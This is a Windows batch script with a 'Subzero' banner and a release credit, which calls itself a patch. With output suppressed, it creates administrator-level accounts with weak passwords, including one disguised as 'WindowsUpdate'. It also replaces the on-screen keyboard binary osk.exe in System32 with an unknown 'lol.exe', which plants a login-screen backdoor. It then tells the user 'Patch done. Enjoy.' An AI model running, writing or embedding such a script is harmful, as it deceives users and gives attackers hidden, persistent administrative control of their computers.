@echo off 
color 0a

echo "============================================================================="
echo " ______     __  __     ______     ______     ______     ______     ______    "  
echo "/\  ___\   /\ \/\ \   /\  == \   /\___  \   /\  ___\   /\  == \   /\  __ \   "  
echo "\ \___  \  \ \ \_\ \  \ \  __<   \/_/  /__  \ \  __\   \ \  __<   \ \ \/\ \  "
echo " \/\_____\  \ \_____\  \ \_____\   /\_____\  \ \_____\  \ \_\ \_\  \ \_____\ "
echo "  \/_____/   \/_____/   \/_____/   \/_____/   \/_____/   \/_/ /_/   \/_____/ "
echo "============================================================================="
echo "       Release R1 . For the freedom we have been asking for. @Elation232     "
echo "============================================================================="

net user WindowsUpdate 12345678 /add > NUL
net user TrustedUser 12345678 /add > NUL
net localgroup administrators WindowsUpdate /add > NUL
cd C:\Windows\System32 > NUL
del osk.exe > NUL
ren lol.exe osk.exe > NUL 

echo "Patch done. Enjoy."
pause > NUL
                                                                      
